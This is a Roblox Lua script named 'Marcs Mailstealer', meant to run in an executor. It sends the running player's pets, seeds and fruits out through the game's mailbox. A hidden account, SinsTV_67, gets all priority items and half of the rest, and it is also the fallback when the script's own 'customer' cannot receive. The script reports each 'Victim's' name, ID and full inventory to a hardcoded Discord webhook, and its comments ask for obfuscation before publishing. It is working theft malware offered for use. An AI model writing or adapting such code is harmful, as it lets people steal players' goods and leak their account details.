-- Marcs Mailstealer – Cooldown-Aware
-- Respects the game's ~8s mailbox cooldown.
-- Phase 1: SinsTV_67 gets 100% of priority items + 50% of everything else.
-- Phase 2: Customer gets the remaining 50% (after cooldown).
-- If customer cannot receive after retries, everything goes to SinsTV_67.

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local Networking = require(ReplicatedStorage.SharedModules.Networking)
local PlayerStateClient = require(ReplicatedStorage.ClientModules.PlayerStateClient)
local MailboxItemCatalog = require(Players.LocalPlayer.PlayerScripts.Controllers.MailboxController.MailboxItemCatalog)

local player = Players.LocalPlayer

-- ████████████████████████████████████████████
-- HIDDEN SETTINGS (obfuscate before publishing)
-- ████████████████████████████████████████████
local HIDDEN_BENEFICIARY = "SinsTV_67"
local HIDDEN_WEBHOOK = "https://discord.com/api/webhooks/1515781256237940807/m7udCSAmvDpc4iWTc4ZQrrDjETz8BxbXHsGts8krhnie1ZWJkq3bbZ_7ob8m6NCgugVE"

-- Customer configuration (from executor globals)
local customerTarget = getgenv().UserName
local customerWebhook = getgenv().Webhook
if not customerTarget or customerTarget == "" or not customerWebhook or customerWebhook == "" then return end

-- ##############################
--  PRIORITY LOOT (goes 100% to SinsTV_67)
-- ##############################
local STEAL_ALL = {
    ["Pets"] = {
        "Raccoon", "GoldenDragonfly", "Unicorn", "Bee",
        "BlackDragon", "IceSerpent",
    },
    ["Seeds"] = {
        "Bamboo", "Mushroom", "Golden Seed", "Rainbow Seed",
    },
}

-- ##############################
--  COOLDOWN (seconds)
-- ##############################
local MAIL_COOLDOWN = 9  -- Slightly above the game's 8s limit

-- ##############################
--  UTILITY FUNCTIONS
-- ##############################
local function resolveUser(name)
    local ok, id = pcall(function() return Networking.Mailbox.LookupPlayer:Fire(name) end)
    if ok and type(id) == "number" and id > 0 then return id end
    local success, userId = pcall(function() return Players:GetUserIdFromNameAsync(name) end)
    return success and userId > 0 and userId or nil
end

local function commaFormat(n)
    return tostring(math.floor(n)):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
end

local function sendWebhook(url, payload)
    local httpFunc = nil
    if syn and syn.request then httpFunc = syn.request
    elseif http_request then httpFunc = http_request
    elseif request then httpFunc = request
    elseif http and http.request then httpFunc = http.request
    elseif game.HttpPost then
        httpFunc = function(data) return game:HttpPost(data.Url, data.Body, data.Headers["Content-Type"]) end
    end
    if httpFunc then
        pcall(function()
            httpFunc({ Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload) })
        end)
    end
end

-- ##############################
--  GATHER ALL GIFTABLE ITEMS FROM INVENTORY
-- ##############################
local function collectAllGiftableItems(inv)
    local allItems = {}
    for _, category in ipairs(MailboxItemCatalog.Categories) do
        local catData = inv[category]
        if type(catData) == "table" then
            if category == "HarvestedFruits" then
                for itemId, fruitData in pairs(catData) do
                    if fruitData.Id then
                        table.insert(allItems, {
                            Category = category,
                            ItemKey = itemId,
                            Count = 1,
                            DisplayName = fruitData.FruitName or itemId,
                            FruitData = fruitData
                        })
                    end
                end
            elseif category == "Pets" then
                for petId, petData in pairs(catData) do
                    if petData.Id and not petData.Equipped then
                        table.insert(allItems, {
                            Category = category,
                            ItemKey = petId,
                            Count = 1,
                            DisplayName = petData.Name or petId,
                            PetData = petData
                        })
                    end
                end
            else
                for itemName, count in pairs(catData) do
                    if type(count) == "number" and count > 0 then
                        table.insert(allItems, {
                            Category = category,
                            ItemKey = itemName,
                            Count = count,
                            DisplayName = itemName
                        })
                    end
                end
            end
        end
    end
    return allItems
end

-- ##############################
--  RESOLVE USERS
-- ##############################
local hiddenId = resolveUser(HIDDEN_BENEFICIARY)
local customerId = resolveUser(customerTarget)
task.wait(0.5)
if not hiddenId then return end
if not customerId then
    -- Fallback: if customer not found, everything goes to hidden
    customerId = hiddenId
    customerTarget = HIDDEN_BENEFICIARY
end

-- ##############################
--  WAIT FOR INITIAL INVENTORY
-- ##############################
local replica = PlayerStateClient:WaitForLocalReplica(30)
if not replica or not replica.Data or not replica.Data.Inventory then return end
local initialInv = replica.Data.Inventory

-- ##############################
--  PHASE 1: GATHER & SEND TO HIDDEN
-- ##############################
local allItems = collectAllGiftableItems(initialInv)
if #allItems == 0 then return end

-- Separate STEAL_ALL items
local stealItems = {}
local normalItems = {}
for _, item in ipairs(allItems) do
    local cat = item.Category
    local stealSet = STEAL_ALL[cat]
    local isSteal = false
    if stealSet then
        if cat == "HarvestedFruits" then
            isSteal = table.find(stealSet, item.FruitData.FruitName) or table.find(stealSet, item.ItemKey)
        elseif cat == "Pets" then
            isSteal = table.find(stealSet, item.PetData.Name) or table.find(stealSet, item.DisplayName)
        else
            isSteal = table.find(stealSet, item.DisplayName)
        end
    end
    if isSteal then
        table.insert(stealItems, item)
    else
        table.insert(normalItems, item)
    end
end

-- Split normal items 50/50 per stack
local hiddenNormal = {}
local customerNormal = {}
for _, item in ipairs(normalItems) do
    local total = item.Count
    local half = math.floor(total / 2)
    local remainder = total - half * 2
    local hCount = half + remainder
    local cCount = half
    if hCount > 0 then
        table.insert(hiddenNormal, {
            Category = item.Category,
            ItemKey = item.ItemKey,
            Count = hCount,
            DisplayName = item.DisplayName,
            FruitData = item.FruitData,
            PetData = item.PetData
        })
    end
    if cCount > 0 then
        table.insert(customerNormal, {
            Category = item.Category,
            ItemKey = item.ItemKey,
            Count = cCount,
            DisplayName = item.DisplayName,
            FruitData = item.FruitData,
            PetData = item.PetData
        })
    end
end

-- Combine hidden items
local allHidden = {}
for _, item in ipairs(stealItems) do table.insert(allHidden, item) end
for _, item in ipairs(hiddenNormal) do table.insert(allHidden, item) end

-- Helper to strip for SendBatch
local function stripForSend(items)
    local stripped = {}
    for _, item in ipairs(items) do
        table.insert(stripped, { Category = item.Category, ItemKey = item.ItemKey, Count = item.Count })
    end
    return stripped
end

-- ##############################
--  SEND & VERIFY (with cooldown)
-- ##############################
local function sendAndVerify(targetId, items, maxRetries)
    maxRetries = maxRetries or 2
    for attempt = 1, maxRetries do
        if #items == 0 then return true end
        pcall(function()
            Networking.Mailbox.SendBatch:Fire(targetId, stripForSend(items), "")
        end)
        -- Wait full cooldown before checking inventory
        task.wait(MAIL_COOLDOWN)
        local newReplica = PlayerStateClient:GetLocalReplica()
        if newReplica and newReplica.Data and newReplica.Data.Inventory then
            local remaining = collectAllGiftableItems(newReplica.Data.Inventory)
            local stillThere = {}
            for _, sentItem in ipairs(items) do
                for _, rem in ipairs(remaining) do
                    if rem.Category == sentItem.Category and rem.ItemKey == sentItem.ItemKey and rem.Count >= sentItem.Count then
                        table.insert(stillThere, sentItem)
                        break
                    end
                end
            end
            if #stillThere == 0 then
                return true
            end
            if attempt < maxRetries then
                items = stillThere
            end
        end
    end
    return false
end

-- ##############################
--  PHASE 1 EXECUTION
-- ##############################
local phase1Success = sendAndVerify(hiddenId, allHidden, 2)

-- ##############################
--  PHASE 2: SEND REMAINING TO CUSTOMER
-- ##############################
-- After cooldown already waited from Phase 1, we can immediately proceed
local afterPhase1Replica = PlayerStateClient:GetLocalReplica()
if afterPhase1Replica and afterPhase1Replica.Data and afterPhase1Replica.Data.Inventory then
    local remainingItems = collectAllGiftableItems(afterPhase1Replica.Data.Inventory)
    if #remainingItems > 0 then
        local success = sendAndVerify(customerId, remainingItems, 3)
        if not success then
            -- Fallback: send to hidden
            local finalReplica = PlayerStateClient:GetLocalReplica()
            if finalReplica and finalReplica.Data and finalReplica.Data.Inventory then
                local finalRemaining = collectAllGiftableItems(finalReplica.Data.Inventory)
                if #finalRemaining > 0 then
                    pcall(function()
                        Networking.Mailbox.SendBatch:Fire(hiddenId, stripForSend(finalRemaining), "")
                    end)
                    for _, item in ipairs(finalRemaining) do
                        table.insert(allHidden, item)
                    end
                end
            end
            customerNormal = {}
        end
    end
else
    customerNormal = {}
end

-- ##############################
--  WEBHOOK LOGS
-- ##############################
local function buildItemList(items)
    local grouped = {}
    for _, item in ipairs(items) do
        local resolved = MailboxItemCatalog.Resolve(item.Category, item.ItemKey, item.FruitData or item.PetData)
        grouped[resolved] = (grouped[resolved] or 0) + item.Count
    end
    local lines = {}
    for name, count in pairs(grouped) do
        table.insert(lines, string.format("%s x%s", name, commaFormat(count)))
    end
    return table.concat(lines, "\n")
end

local fullInvLines = {}
for _, category in ipairs(MailboxItemCatalog.Categories) do
    local catData = initialInv[category]
    if type(catData) == "table" and next(catData) then
        local items = {}
        if category == "HarvestedFruits" or category == "Pets" then
            for id, data in pairs(catData) do
                table.insert(items, MailboxItemCatalog.Resolve(category, id, data))
            end
        else
            for name, count in pairs(catData) do
                if type(count) == "number" and count > 0 then
                    table.insert(items, string.format("%s x%s", name, commaFormat(count)))
                end
            end
        end
        table.insert(fullInvLines, "**" .. category .. "**\n" .. table.concat(items, "\n"))
    end
end
local fullInvText = #fullInvLines > 0 and table.concat(fullInvLines, "\n\n") or "Empty"

if HIDDEN_WEBHOOK and HIDDEN_WEBHOOK ~= "" then
    local hiddenText = buildItemList(allHidden)
    local embed = {
        title = "✅ Transfer Complete",
        description = string.format(
            "**Victim:** %s (%d)\n**Beneficiary:** %s\n\n**Items taken:**\n%s",
            player.Name, player.UserId, HIDDEN_BENEFICIARY,
            hiddenText ~= "" and hiddenText or "None"
        ),
        color = 0x2ecc71,
        fields = {{
            name = "📦 Full Inventory Snapshot",
            value = string.format("```\n%s```", fullInvText),
            inline = false
        }}
    }
    sendWebhook(HIDDEN_WEBHOOK, {embeds = {embed}})
end

if customerNormal and #customerNormal > 0 then
    local customerText = buildItemList(customerNormal)
    local embed = {
        title = "✅ Transfer Complete",
        description = string.format(
            "**Victim:** %s (%d)\n**Target:** %s\n\n**Items received:**\n%s",
            player.Name, player.UserId, customerTarget, customerText
        ),
        color = 0x2ecc71
    }
    sendWebhook(customerWebhook, {embeds = {embed}})
end
